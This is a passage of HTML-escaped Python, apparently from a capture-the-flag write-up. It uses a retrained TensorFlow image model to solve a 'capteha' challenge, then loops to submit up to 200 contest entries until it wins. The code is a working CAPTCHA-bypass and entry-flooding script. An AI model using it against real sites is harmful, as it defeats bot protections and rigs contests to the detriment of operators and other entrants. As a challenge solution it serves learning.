class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()]&lt;/span&gt; &lt;span class="c1"&gt;# cleaning and formatting&lt;/span&gt;

    &lt;span class="c1"&gt;#print(b64_images)&lt;/span&gt;
    &lt;span class="c1"&gt;# 0 wipe unknown_images dir&lt;/span&gt;
    &lt;span class="c1"&gt;# why wipe it tho?&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;shutil&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rmtree&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;unknown_images&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mkdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;unknown_images&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mkdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;unknown_images&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="kc"&gt;True&lt;/span&gt;
    &lt;span class="c1"&gt;# 1 write b64 to unknown_images dir&lt;/span&gt;

    &lt;span class="n"&gt;imgcnt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;b64_images&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;imgcnt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;imgcnt&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;uuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uuid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
           &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
           &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;unknown_images/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;uuid&lt;/span&gt;
           &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;wb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="c1"&gt;#f.write(content.decode(&amp;quot;utf-8&amp;quot;))&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
           &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="c1"&gt;#    if imgcnt &amp;gt; 10:&lt;/span&gt;
     &lt;span class="c1"&gt;#       break&lt;/span&gt;
    &lt;span class="c1"&gt;# 2 run the predict against it&lt;/span&gt;
    &lt;span class="c1"&gt;#  python3 predict_images_using_trained_model.py would have been fun instead we copy pasta&lt;/span&gt;
    &lt;span class="c1"&gt;# https://github.com/chrisjd20/img_rec_tf_ml_demo/blob/master/retrain.py talks about mobilenet and speed optimizations..&lt;/span&gt;

    &lt;span class="c1"&gt;# Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory&lt;/span&gt;
    &lt;span class="n"&gt;graph&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;load_graph&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/tmp/retrain_tmp/output_graph.pb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;labels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;load_labels&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/tmp/retrain_tmp/output_labels.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# Load up our session&lt;/span&gt;
    &lt;span class="n"&gt;input_operation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_operation_by_name&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import/Placeholder&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;output_operation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_operation_by_name&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import/final_result&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sess&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# Can use queues and threading to spead up the processing&lt;/span&gt;
    &lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;unknown_images_dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;unknown_images&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;unknown_images&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unknown_images_dir&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;#Going to interate over each of our images.&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;unknown_images&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;img_full_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s1"&gt;/&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unknown_images_dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Processing Image &lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img_full_path&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="c1"&gt;# We don&amp;#39;t want to process too many images at once. 10 threads max&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.0001&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;#predict_image function is expecting png image bytes so we read image as &amp;#39;rb&amp;#39; to get a bytes object&lt;/span&gt;
        &lt;span class="n"&gt;image_bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img_full_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;predict_image&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;graph&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;image_bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;img_full_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;labels&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_operation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output_operation&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Waiting For Threads to Finish...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;qsize&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unknown_images&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.001&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;#getting a list of all threads returned results&lt;/span&gt;
    &lt;span class="n"&gt;prediction_results&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;qsize&lt;/span&gt;&lt;span class="p"&gt;())]&lt;/span&gt;

    &lt;span class="c1"&gt;#do something with our results... Like print them to the screen.&lt;/span&gt;

    &lt;span class="c1"&gt;# 3 get a list of the uuids for each type&lt;/span&gt;
    &lt;span class="n"&gt;good_images&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;prediction&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;prediction_results&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TensorFlow Predicted &lt;/span&gt;&lt;span class="si"&gt;{img_full_path}&lt;/span&gt;&lt;span class="s1"&gt; is a &lt;/span&gt;&lt;span class="si"&gt;{prediction}&lt;/span&gt;&lt;span class="s1"&gt; with &lt;/span&gt;&lt;span class="si"&gt;{percent:.2%}&lt;/span&gt;&lt;span class="s1"&gt; Accuracy&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;prediction&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;prediction&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;prediction&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;challenge_image_types&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;good_images&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prediction&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;img_full_path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="c1"&gt;# TensorFlow Predicted unknown_images/dc646068-e584-11e9-97c1-309c23aaf0ac is a Santa Hats with 99.86% Accuracy&lt;/span&gt;

    &lt;span class="c1"&gt;# 4 make a new b64_images csv list with the uuids&lt;/span&gt;
    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;challenge_image_types&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;good_images&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;good_images_csv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;good_images&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="sd"&gt;    MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="c1"&gt;# This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .&lt;/span&gt;
    &lt;span class="c1"&gt;#final_answer = &amp;#39;,&amp;#39;.join( [ img[&amp;#39;uuid&amp;#39;] for img in b64_images ] )&lt;/span&gt;
    &lt;span class="n"&gt;final_answer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;good_images_csv&lt;/span&gt;

    &lt;span class="n"&gt;json_resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;api/capteha/submit&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;answer&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;final_answer&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;json_resp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;request&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="c1"&gt;# If it fails just run again. ML might get one wrong occasionally&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;FAILED MACHINE LEARNING GUESS&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;--------------------&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;Our ML Guess:&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;--------------------&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;final_answer&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;--------------------&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;Server Response:&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;--------------------&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;json_resp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;CAPTEHA Solved!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;# If we get to here, we are successful and can submit a bunch of entries till we win&lt;/span&gt;
    &lt;span class="n"&gt;userinfo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Krampus Hollyfeld&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;email&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;yourREALemailAddress&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;age&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;180&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;about&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cause they&amp;#39;re so flippin yummy!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;favorites&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;thickmints&amp;#39;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="c1"&gt;# If we win the once-per minute drawing, it will tell us we were emailed.&lt;/span&gt;
    &lt;span class="c1"&gt;# Should be no more than 200 times before we win. If more, somethings wrong.&lt;/span&gt;
    &lt;span class="n"&gt;entry_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;entry_count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;yourREALemailAddress&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;entry_response&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;entry_count&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Submitting lots of entries until we win the contest! Entry #&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;entry_count&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;entry_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;api/entry&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;userinfo&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
        &lt;span class="n"&gt;entry_count&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
